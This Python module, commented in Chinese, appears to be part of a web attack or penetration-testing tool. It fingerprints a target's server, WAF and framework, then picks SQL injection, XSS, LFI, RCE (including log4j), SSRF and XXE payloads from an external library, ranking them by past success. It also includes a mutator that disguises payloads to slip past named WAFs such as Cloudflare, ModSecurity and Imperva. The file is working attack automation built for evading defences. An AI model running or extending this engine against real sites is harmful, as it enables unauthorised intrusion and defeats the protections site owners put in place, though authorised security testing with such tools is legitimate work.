#!/usr/bin/env python3
"""
智能Payload引擎 - 优化Payload库使用率
基于目标特征、WAF检测、历史成功率动态选择最优Payload
"""

import re
import hashlib
import json
import logging
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict
from pathlib import Path

from modules.mega_payloads import MegaPayloads

logger = logging.getLogger(__name__)


@dataclass
class PayloadStats:
    """Payload统计信息"""
    total_uses: int = 0
    successful_uses: int = 0
    last_used: str = ""
    avg_response_time: float = 0.0
    waf_blocked_count: int = 0
    
    @property
    def success_rate(self) -> float:
        if self.total_uses == 0:
            return 0.0
        return self.successful_uses / self.total_uses


class TargetProfile:
    """目标特征分析"""
    
    def __init__(self, url: str, response_headers: Dict[str, str] = None,
                 response_body: str = "", status_code: int = 200):
        self.url = url
        self.headers = response_headers or {}
        self.body = response_body
        self.status_code = status_code
        self.features = self._analyze()
    
    def _analyze(self) -> Dict[str, Any]:
        """分析目标特征"""
        features = {
            "server": self._detect_server(),
            "waf": self._detect_waf(),
            "framework": self._detect_framework(),
            "language": self._detect_language(),
            "encoding": self._detect_encoding(),
            "content_type": self.headers.get("content-type", ""),
            "has_csp": "content-security-policy" in self.headers,
            "has_xss_protection": "x-xss-protection" in self.headers,
        }
        return features
    
    def _detect_server(self) -> str:
        """检测服务器类型"""
        server = self.headers.get("server", "").lower()
        if "nginx" in server:
            return "nginx"
        elif "apache" in server:
            return "apache"
        elif "iis" in server:
            return "iis"
        elif "tomcat" in server:
            return "tomcat"
        return "unknown"
    
    def _detect_waf(self) -> Optional[str]:
        """检测WAF"""
        waf_signatures = {
            "cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
            "aws_waf": ["x-amzn-requestid", "awselb"],
            "akamai": ["akamai", "x-akamai"],
            "modsecurity": ["mod_security", "modsecurity"],
            "f5_bigip": ["bigip", "f5"],
            "imperva": ["incap_ses", "visid_incap"],
            "sucuri": ["sucuri", "x-sucuri"],
            "fortinet": ["fortigate", "fortiweb"],
        }
        
        headers_str = json.dumps(self.headers).lower()
        body_lower = self.body.lower()
        
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig in headers_str or sig in body_lower:
                    return waf_name
        return None
    
    def _detect_framework(self) -> Optional[str]:
        """检测Web框架"""
        framework_patterns = {
            "django": [r"csrfmiddlewaretoken", r"django"],
            "flask": [r"werkzeug", r"flask"],
            "rails": [r"rails", r"_rails_", r"authenticity_token"],
            "laravel": [r"laravel", r"_token"],
            "spring": [r"spring", r"jsessionid"],
            "express": [r"express", r"x-powered-by.*express"],
            "asp.net": [r"asp\.net", r"__viewstate", r"__eventvalidation"],
            "php": [r"phpsessid", r"x-powered-by.*php"],
        }
        
        combined = (json.dumps(self.headers) + self.body).lower()
        
        for framework, patterns in framework_patterns.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    return framework
        return None
    
    def _detect_language(self) -> Optional[str]:
        """检测后端语言"""
        lang_indicators = {
            "php": [".php", "phpsessid", "x-powered-by: php"],
            "java": [".jsp", ".do", "jsessionid", "java"],
            "python": [".py", "wsgi", "django", "flask"],
            "asp": [".asp", ".aspx", "asp.net"],
            "node": ["express", "node.js"],
            "ruby": [".rb", "rails", "rack"],
        }
        
        combined = (self.url + json.dumps(self.headers) + self.body).lower()
        
        for lang, indicators in lang_indicators.items():
            for indicator in indicators:
                if indicator in combined:
                    return lang
        return None
    
    def _detect_encoding(self) -> str:
        """检测字符编码"""
        content_type = self.headers.get("content-type", "")
        if "utf-8" in content_type.lower():
            return "utf-8"
        elif "gbk" in content_type.lower() or "gb2312" in content_type.lower():
            return "gbk"
        return "utf-8"


class SmartPayloadSelector:
    """智能Payload选择器"""
    
    def __init__(self, stats_file: str = "data/payload_stats.json"):
        self.stats_file = Path(stats_file)
        self.stats: Dict[str, PayloadStats] = {}
        self.payload_cache: Dict[str, List[str]] = {}
        self._load_stats()
    
    def _load_stats(self):
        """加载历史统计"""
        if self.stats_file.exists():
            try:
                with open(self.stats_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for key, value in data.items():
                        self.stats[key] = PayloadStats(**value)
            except Exception as e:
                logger.warning(f"加载Payload统计失败: {e}")
    
    def _save_stats(self):
        """保存统计数据"""
        try:
            self.stats_file.parent.mkdir(parents=True, exist_ok=True)
            data = {k: vars(v) for k, v in self.stats.items()}
            with open(self.stats_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.warning(f"保存Payload统计失败: {e}")
    
    def _get_payload_hash(self, payload: str) -> str:
        """获取Payload哈希"""
        return hashlib.md5(payload.encode()).hexdigest()[:12]
    
    def select_payloads(self, vuln_type: str, target: TargetProfile,
                        max_count: int = 20) -> List[Tuple[str, float]]:
        """
        智能选择Payload
        返回: [(payload, score), ...]
        """
        # 获取所有可用payload
        all_payloads = self._get_all_payloads(vuln_type, target)
        
        # 计算每个payload的得分
        scored_payloads = []
        for payload in all_payloads:
            score = self._calculate_score(payload, vuln_type, target)
            scored_payloads.append((payload, score))
        
        # 按得分排序
        scored_payloads.sort(key=lambda x: x[1], reverse=True)
        
        # 返回top N
        return scored_payloads[:max_count]
    
    def _get_all_payloads(self, vuln_type: str, target: TargetProfile) -> List[str]:
        """获取指定类型的所有Payload"""
        cache_key = f"{vuln_type}_{target.features.get('waf', 'none')}"
        
        if cache_key in self.payload_cache:
            return self.payload_cache[cache_key]
        
        payloads = []
        
        if vuln_type == "sqli":
            # 根据检测到的数据库类型选择
            dbms = self._guess_dbms(target)
            payloads = MegaPayloads.get("sqli", "all", dbms)
            
            # 如果有WAF，添加绕过payload
            if target.features.get("waf"):
                waf_bypass = MegaPayloads.WAF_BYPASS.get(
                    f"{target.features['waf']}_bypass", 
                    MegaPayloads.WAF_BYPASS.get("comment", [])
                )
                payloads.extend(waf_bypass)
        
        elif vuln_type == "xss":
            payloads = MegaPayloads.get("xss", "all")
            
            # 根据CSP调整
            if target.features.get("has_csp"):
                payloads.extend(MegaPayloads.XSS.get("csp_bypass", []))
        
        elif vuln_type == "lfi":
            # 根据操作系统选择
            if target.features.get("server") == "iis":
                payloads = MegaPayloads.get("lfi", "windows")
            else:
                payloads = MegaPayloads.get("lfi", "linux")
            payloads.extend(MegaPayloads.get("lfi", "php_wrapper"))
        
        elif vuln_type == "rce":
            payloads = MegaPayloads.get("rce", "command_injection")
            
            # 根据语言添加特定payload
            lang = target.features.get("language")
            if lang == "php":
                payloads.extend(MegaPayloads.get("rce", "php"))
            elif lang == "java":
                payloads.extend(MegaPayloads.get("rce", "log4j"))
        
        elif vuln_type == "ssrf":
            payloads = MegaPayloads.get("ssrf", "all")
        
        elif vuln_type == "xxe":
            payloads = MegaPayloads.get("xxe", "all")
        
        else:
            # 通用获取
            payloads = MegaPayloads.get(vuln_type, "all")
        
        self.payload_cache[cache_key] = payloads
        return payloads
    
    def _guess_dbms(self, target: TargetProfile) -> str:
        """猜测数据库类型"""
        lang = target.features.get("language")
        framework = target.features.get("framework")
        
        # 基于语言/框架推断
        if lang == "php" or framework in ["laravel", "wordpress"]:
            return "mysql"
        elif lang == "asp" or framework == "asp.net":
            return "mssql"
        elif lang == "python" or framework in ["django", "flask"]:
            return "postgresql"
        elif lang == "java" or framework == "spring":
            return "mysql"  # 或oracle
        
        return "mysql"  # 默认
    
    def _calculate_score(self, payload: str, vuln_type: str,
                         target: TargetProfile) -> float:
        """计算Payload得分"""
        score = 50.0  # 基础分
        
        payload_hash = self._get_payload_hash(payload)
        stats = self.stats.get(payload_hash)
        
        # 1. 历史成功率加分 (最高+30)
        if stats and stats.total_uses > 0:
            score += stats.success_rate * 30
        
        # 2. WAF绕过能力 (最高+20)
        waf = target.features.get("waf")
        if waf:
            if self._is_waf_bypass_payload(payload, waf):
                score += 20
            else:
                score -= 10  # 普通payload在有WAF时降分
        
        # 3. 编码复杂度 (适度编码加分)
        encoding_score = self._score_encoding(payload)
        score += encoding_score
        
        # 4. Payload长度 (过长降分)
        if len(payload) > 500:
            score -= 5
        elif len(payload) < 50:
            score += 5
        
        # 5. 特定框架适配 (+10)
        framework = target.features.get("framework")
        if framework and self._is_framework_specific(payload, framework):
            score += 10
        
        # 6. 被WAF拦截历史 (-20)
        if stats and stats.waf_blocked_count > 3:
            score -= 20
        
        return max(0, min(100, score))  # 限制在0-100
    
    def _is_waf_bypass_payload(self, payload: str, waf: str) -> bool:
        """检查是否为WAF绕过payload"""
        bypass_indicators = [
            "/*!",  # MySQL注释绕过
            "%00",  # 空字节
            "/**/",  # 注释
            "%0a", "%0d",  # 换行
            "\\u00",  # Unicode
            "&#",  # HTML实体
        ]
        return any(ind in payload.lower() for ind in bypass_indicators)
    
    def _score_encoding(self, payload: str) -> float:
        """评估编码复杂度得分"""
        score = 0.0
        
        # URL编码
        if "%" in payload:
            score += 3
        
        # Unicode编码
        if "\\u" in payload or "&#" in payload:
            score += 5
        
        # 大小写混合
        if any(c.isupper() for c in payload) and any(c.islower() for c in payload):
            score += 2
        
        # 过度编码降分
        if payload.count("%") > 20:
            score -= 5
        
        return score
    
    def _is_framework_specific(self, payload: str, framework: str) -> bool:
        """检查是否为框架特定payload"""
        framework_keywords = {
            "django": ["csrf", "django"],
            "rails": ["authenticity_token", "rails"],
            "spring": ["spring", "java"],
            "laravel": ["_token", "laravel"],
        }
        
        keywords = framework_keywords.get(framework, [])
        return any(kw in payload.lower() for kw in keywords)
    
    def record_result(self, payload: str, success: bool, 
                      response_time: float = 0, waf_blocked: bool = False):
        """记录Payload使用结果"""
        payload_hash = self._get_payload_hash(payload)
        
        if payload_hash not in self.stats:
            self.stats[payload_hash] = PayloadStats()
        
        stats = self.stats[payload_hash]
        stats.total_uses += 1
        if success:
            stats.successful_uses += 1
        if waf_blocked:
            stats.waf_blocked_count += 1
        
        # 更新平均响应时间
        if response_time > 0:
            n = stats.total_uses
            stats.avg_response_time = (
                (stats.avg_response_time * (n - 1) + response_time) / n
            )
        
        from datetime import datetime
        stats.last_used = datetime.now().isoformat()
        
        # 定期保存
        if stats.total_uses % 10 == 0:
            self._save_stats()
    
    def get_optimized_payloads(self, vuln_type: str, url: str,
                               headers: Dict[str, str] = None,
                               body: str = "") -> Dict[str, Any]:
        """获取优化后的Payload集合"""
        # 分析目标
        target = TargetProfile(url, headers, body)
        
        # 选择最优payload
        selected = self.select_payloads(vuln_type, target)
        
        # 统计信息
        total_available = len(self._get_all_payloads(vuln_type, target))
        
        return {
            "vuln_type": vuln_type,
            "target_features": target.features,
            "total_available": total_available,
            "selected_count": len(selected),
            "optimization_ratio": f"{len(selected)}/{total_available} ({len(selected)/total_available*100:.1f}%)",
            "payloads": [
                {"payload": p, "score": round(s, 2)} 
                for p, s in selected
            ],
            "recommendations": self._get_recommendations(target, vuln_type)
        }
    
    def _get_recommendations(self, target: TargetProfile, 
                             vuln_type: str) -> List[str]:
        """生成测试建议"""
        recommendations = []
        
        if target.features.get("waf"):
            recommendations.append(
                f"检测到WAF: {target.features['waf']}，已优先选择绕过payload"
            )
        
        if target.features.get("has_csp") and vuln_type == "xss":
            recommendations.append("检测到CSP，建议尝试CSP绕过技术")
        
        if target.features.get("framework"):
            recommendations.append(
                f"检测到框架: {target.features['framework']}，已适配特定payload"
            )
        
        if not recommendations:
            recommendations.append("未检测到特殊防护，使用标准payload集")

        return recommendations


# ========== Payload变异器 (新增) ==========

import urllib.parse
import random


class PayloadMutator:
    """
    Payload变异器 - WAF绕过
    支持多种编码和混淆技术
    """

    MUTATIONS = {
        "case": "大小写混淆",
        "url_encode": "URL编码",
        "double_url": "双重URL编码",
        "comment_split": "注释分割",
        "unicode": "Unicode编码",
        "hex": "十六进制编码",
        "concat": "字符串拼接",
        "whitespace": "空白符替换",
    }

    # WAF特定绕过策略
    WAF_STRATEGIES = {
        "cloudflare": ["double_url", "unicode", "comment_split"],
        "aws_waf": ["case", "whitespace", "concat"],
        "modsecurity": ["comment_split", "hex", "double_url"],
        "imperva": ["unicode", "case", "whitespace"],
        "default": ["case", "url_encode", "comment_split"],
    }

    @classmethod
    def mutate(cls, payload: str, waf: str = None,
               mutations: List[str] = None) -> List[str]:
        """
        对Payload进行变异

        Args:
            payload: 原始Payload
            waf: 检测到的WAF类型
            mutations: 指定变异方法列表

        Returns:
            变异后的Payload列表
        """
        results = [payload]  # 包含原始payload

        # 确定使用的变异方法
        if mutations:
            methods = mutations
        elif waf:
            methods = cls.WAF_STRATEGIES.get(waf, cls.WAF_STRATEGIES["default"])
        else:
            methods = list(cls.MUTATIONS.keys())

        for method in methods:
            mutated = cls._apply_mutation(payload, method)
            if mutated and mutated != payload:
                results.append(mutated)

        return list(set(results))  # 去重

    @classmethod
    def _apply_mutation(cls, payload: str, method: str) -> str:
        """应用单个变异方法"""
        if method == "case":
            return cls._case_mutation(payload)
        elif method == "url_encode":
            return cls._url_encode(payload)
        elif method == "double_url":
            return cls._double_url_encode(payload)
        elif method == "comment_split":
            return cls._comment_split(payload)
        elif method == "unicode":
            return cls._unicode_encode(payload)
        elif method == "hex":
            return cls._hex_encode(payload)
        elif method == "concat":
            return cls._concat_split(payload)
        elif method == "whitespace":
            return cls._whitespace_replace(payload)
        return payload

    @classmethod
    def _case_mutation(cls, payload: str) -> str:
        """大小写混淆: SELECT -> SeLeCt"""
        result = []
        for i, c in enumerate(payload):
            if c.isalpha():
                result.append(c.upper() if i % 2 == 0 else c.lower())
            else:
                result.append(c)
        return "".join(result)

    @classmethod
    def _url_encode(cls, payload: str) -> str:
        """URL编码关键字符"""
        chars_to_encode = "'\"><;|&"
        result = payload
        for c in chars_to_encode:
            result = result.replace(c, urllib.parse.quote(c))
        return result

    @classmethod
    def _double_url_encode(cls, payload: str) -> str:
        """双重URL编码"""
        return urllib.parse.quote(urllib.parse.quote(payload))

    @classmethod
    def _comment_split(cls, payload: str) -> str:
        """SQL注释分割: UNION -> UN/**/ION"""
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                # 在关键字中间插入注释
                mid = len(kw) // 2
                replacement = kw[:mid] + "/**/" + kw[mid:]
                result = re.sub(kw, replacement, result, flags=re.IGNORECASE)
        return result

    @classmethod
    def _unicode_encode(cls, payload: str) -> str:
        """Unicode编码: ' -> \\u0027"""
        special_chars = {"'": "\\u0027", '"': "\\u0022", "<": "\\u003c", ">": "\\u003e"}
        result = payload
        for char, unicode_repr in special_chars.items():
            result = result.replace(char, unicode_repr)
        return result

    @classmethod
    def _hex_encode(cls, payload: str) -> str:
        """十六进制编码: admin -> 0x61646d696e"""
        # 只编码字母数字部分
        words = re.findall(r'\b[a-zA-Z]+\b', payload)
        result = payload
        for word in words[:2]:  # 只编码前两个单词
            hex_val = "0x" + word.encode().hex()
            result = result.replace(word, hex_val, 1)
        return result

    @classmethod
    def _concat_split(cls, payload: str) -> str:
        """字符串拼接: 'admin' -> 'ad'+'min'"""
        # 查找引号内的字符串
        strings = re.findall(r"'([^']+)'", payload)
        result = payload
        for s in strings:
            if len(s) > 3:
                mid = len(s) // 2
                concat_str = f"'{s[:mid]}'||'{s[mid:]}'"
                result = result.replace(f"'{s}'", concat_str, 1)
        return result

    @classmethod
    def _whitespace_replace(cls, payload: str) -> str:
        """空白符替换: 空格 -> %09 或 /**/"""
        alternatives = ["%09", "%0a", "%0d", "/**/", "+"]
        replacement = random.choice(alternatives)
        return payload.replace(" ", replacement)

    @classmethod
    def generate_variants(cls, payload: str, waf: str = None,
                          count: int = 10) -> List[Dict[str, str]]:
        """
        生成多个变体

        Args:
            payload: 原始Payload
            waf: WAF类型
            count: 生成数量

        Returns:
            [{"payload": ..., "mutation": ...}, ...]
        """
        variants = []
        seen = set()

        for method in cls.MUTATIONS.keys():
            mutated = cls._apply_mutation(payload, method)
            if mutated not in seen:
                seen.add(mutated)
                variants.append({
                    "payload": mutated,
                    "mutation": method,
                    "description": cls.MUTATIONS[method]
                })

        # 组合变异
        if len(variants) < count:
            for m1 in list(cls.MUTATIONS.keys())[:3]:
                for m2 in list(cls.MUTATIONS.keys())[3:]:
                    p1 = cls._apply_mutation(payload, m1)
                    p2 = cls._apply_mutation(p1, m2)
                    if p2 not in seen:
                        seen.add(p2)
                        variants.append({
                            "payload": p2,
                            "mutation": f"{m1}+{m2}",
                            "description": f"{cls.MUTATIONS[m1]} + {cls.MUTATIONS[m2]}"
                        })
                    if len(variants) >= count:
                        break
                if len(variants) >= count:
                    break

        return variants[:count]


def mutate_payload(payload: str, waf: str = None) -> Dict[str, Any]:
    """
    便捷函数: 变异Payload

    Args:
        payload: 原始Payload
        waf: WAF类型

    Returns:
        变异结果
    """
    variants = PayloadMutator.generate_variants(payload, waf, count=10)
    return {
        "original": payload,
        "waf": waf or "unknown",
        "variants_count": len(variants),
        "variants": variants
    }
